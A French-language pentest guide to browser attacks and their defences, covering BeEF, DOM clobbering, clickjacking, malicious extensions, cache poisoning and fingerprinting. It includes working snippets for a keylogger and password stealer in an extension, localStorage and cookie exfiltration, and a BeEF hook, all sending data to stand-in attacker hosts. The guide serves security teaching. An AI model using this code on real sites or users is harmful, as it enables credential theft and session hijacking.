# Attaques sur les navigateurs web : exploitation et défense

Les navigateurs web sont la porte d'entrée principale vers Internet et l'une des surfaces d'attaque les plus exploitées. Extensions malveillantes, attaques DOM, BeEF framework — ce guide couvre les techniques d'exploitation des navigateurs et les contre-mesures.

## Le navigateur comme vecteur d'attaque

```
Pourquoi les navigateurs sont ciblés :
→ Installés sur 100% des machines
→ Exécutent du code non fiable (JavaScript)
→ Stockent des credentials, cookies, historique
→ Accès aux microphones, caméras, géolocalisation
→ Point d'entrée pour les attaques drive-by download

Statistiques :
→ 60% des attaques initiales passent par le navigateur
→ Phishing via email → lien → navigateur = vecteur #1
→ Les CVE navigateurs : des centaines par an
```

## BeEF — Browser Exploitation Framework

```javascript
// BeEF (Browser Exploitation Framework) est un outil de pentest
// qui permet de contrôler des navigateurs victimes via XSS

// Installation
git clone https://github.com/beefproject/beef
cd beef && ./install
./beef -x  // Démarrer BeEF

// Une fois un navigateur hooké via XSS :
// <script src="http://attaquant.com:3000/hook.js"></script>

// Depuis l'interface BeEF, on peut :
// → Récupérer l'historique de navigation
// → Prendre une capture d'écran de ce que voit la victime
// → Détecter les plugins installés
// → Rediriger vers une page de phishing
// → Lancer des scans réseau depuis le navigateur victime
// → Keylogging via JavaScript
// → Voler les cookies (si pas HttpOnly)
// → Social engineering (fausses alertes, faux login)

// Commandes BeEF via API REST
const beef_api = "http://localhost:3000/api";

// Lister les browsers hookés
fetch(`${beef_api}/hooks`, {
    headers: {"X-Auth-Token": "BEEF_API_KEY"}
}).then(r => r.json()).then(console.log);

// Exécuter une commande sur un browser
fetch(`${beef_api}/modules`, {
    method: "POST",
    headers: {
        "X-Auth-Token": "BEEF_API_KEY",
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        "beefhook": "HOOK_ID",
        "command_module_id": 6  // 6 = Get Cookie
    })
});
```

## Attaques DOM avancées

### DOM Clobbering

```html
<!-- DOM Clobbering : écraser des variables JS avec des éléments HTML -->

<!-- Code JavaScript vulnérable -->
<script>
    if (window.config && window.config.isAdmin) {
        showAdminPanel();
    }
</script>

<!-- Injection HTML qui "clobbers" la variable config -->
<form id="config">
    <input id="isAdmin" value="true">
</form>

<!-- window.config = formulaire HTML
     window.config.isAdmin = input HTML (truthy !)
     → showAdminPanel() est appelé ! -->

<!-- Protection :
    Ne jamais utiliser window.x pour stocker des configs
    Utiliser des namespaces sécurisés
    Content Security Policy stricte -->
```

### Clickjacking

```html
<!-- Clickjacking : superposer une iframe invisible sur un bouton légitime -->

<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.0001;  /* Invisible mais cliquable ! */
        z-index: 9999;
    }
    .fake-button {
        position: absolute;
        top: 200px;
        left: 300px;
    }
</style>

<div class="fake-button">
    <button>Cliquez ici pour gagner un iPhone ! 🎁</button>
</div>

<!-- iframe pointant vers un vrai site -->
<iframe src="https://banking.example.com/transfer?amount=1000&to=attaquant">
</iframe>

<!-- La victime croit cliquer sur le bouton cadeau
     mais clique en réalité sur "Confirmer le virement" ! -->

<!-- Protection :
    X-Frame-Options: DENY
    Content-Security-Policy: frame-ancestors 'none' -->
```

## Extensions de navigateur malveillantes

```python
# Anatomie d'une extension malveillante

# manifest.json - Déclare les permissions demandées
manifest = {
    "name": "Ad Blocker Pro",  # Nom innocent
    "version": "1.0",
    "manifest_version": 3,
    "permissions": [
        "tabs",            # Voir tous les onglets ouverts
        "webRequest",      # Intercepter TOUTES les requêtes
        "storage",         # Stocker des données
        "cookies",         # Accès aux cookies !
        "<all_urls>"       # Sur TOUS les sites
    ],
    "background": {
        "service_worker": "background.js"
    },
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["content.js"]
    }]
}

# content.js - S'exécute sur chaque page visitée
malicious_content = """
// Keylogger dans l'extension
document.addEventListener('keypress', function(e) {
    fetch('https://attaquant.com/log', {
        method: 'POST',
        body: JSON.stringify({
            key: e.key,
            url: window.location.href,
            timestamp: Date.now()
        })
    });
});

// Vol de credentials
document.querySelectorAll('input[type=password]').forEach(input => {
    input.addEventListener('change', function() {
        fetch('https://attaquant.com/creds', {
            method: 'POST',
            body: JSON.stringify({
                password: this.value,
                url: window.location.href
            })
        });
    });
});
"""

# Détection d'extensions malveillantes :
# → Vérifier les permissions demandées (trop larges = suspect)
# → Analyser le code source (extensions sont des ZIP)
# → CRXcavator.io pour analyser les extensions Chrome
# → Extension Privacy Badger pour surveiller le tracking
```

## Cache Poisoning et Browser Cache Attacks

```http
# Web Cache Poisoning via headers non cachés

GET /home HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Si le serveur utilise X-Forwarded-Host pour générer des URLs
# et que la réponse est mise en cache...

# Réponse cachée contenant :
# <script src="https://evil.com/analytics.js"></script>
# Servi à TOUS les visiteurs suivants !

# Contre-mesures :
# → Ne jamais faire confiance aux headers non standard
# → Cache-Control: no-store pour les pages sensibles
# → Vary header pour différencier les caches par header
```

## Attaques sur le stockage navigateur

```javascript
// Vol de données depuis localStorage/sessionStorage via XSS

// Exfiltrer tout le localStorage
const allData = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    allData[key] = localStorage.getItem(key);
}

// Envoyer vers le serveur attaquant
fetch('https://attaquant.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        localStorage: allData,
        cookies: document.cookie,
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href
    })
});

// Protection :
// → Ne jamais stocker de données sensibles en localStorage
// → Tokens d'auth : utiliser des cookies HttpOnly + Secure
// → CSP pour limiter les domaines vers lesquels JS peut envoyer des données
```

## Content Security Policy (CSP) — La défense principale

```http
# CSP stricte contre la plupart des attaques navigateur

Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-RANDOM123' https://cdn.trusted.com;
    style-src 'self' 'nonce-RANDOM123';
    img-src 'self' data: https:;
    connect-src 'self' https://api.monsite.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;

# Explication :
# default-src 'self'          → Tout depuis le même domaine par défaut
# script-src 'nonce-...'      → Seuls les scripts avec ce nonce s'exécutent
# frame-ancestors 'none'      → Bloque le clickjacking
# base-uri 'self'             → Empêche base tag hijacking
# upgrade-insecure-requests   → Force HTTPS

# Tester votre CSP :
# https://csp-evaluator.withgoogle.com/
```

## Fingerprinting navigateur et vie privée

```javascript
// Les sites peuvent identifier votre navigateur sans cookies
// via le Browser Fingerprinting

async function getFingerprint() {
    const fingerprint = {
        // Résolution écran
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,

        // Timezone
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

        // Plugins installés
        plugins: Array.from(navigator.plugins).map(p => p.name).join(','),

        // Fonts disponibles (via Canvas)
        canvas: getCanvasHash(),

        // WebGL renderer (unique par GPU + driver)
        webgl: getWebGLRenderer(),

        // Support de fonctionnalités
        features: {
            doNotTrack: navigator.doNotTrack,
            touchPoints: navigator.maxTouchPoints,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory
        }
    };

    return fingerprint;
}

// Protection contre le fingerprinting :
// → Brave Browser : randomise les valeurs canvas/WebGL
// → Firefox avec privacy.resistFingerprinting = true
// → Tor Browser : harmonise toutes les valeurs pour les rendre identiques
```

## Conclusion

Les navigateurs sont des vecteurs d'attaque complexes et omniprésents. La défense en profondeur combine : **CSP stricte** pour bloquer l'exécution de code non autorisé, **X-Frame-Options** contre le clickjacking, **cookies HttpOnly+Secure** contre le vol de session, et une **politique stricte sur les extensions** installées. Pour les pentesters, BeEF reste l'outil de référence pour démontrer l'impact réel d'une XSS.

---
*Catégorie : Pentest*
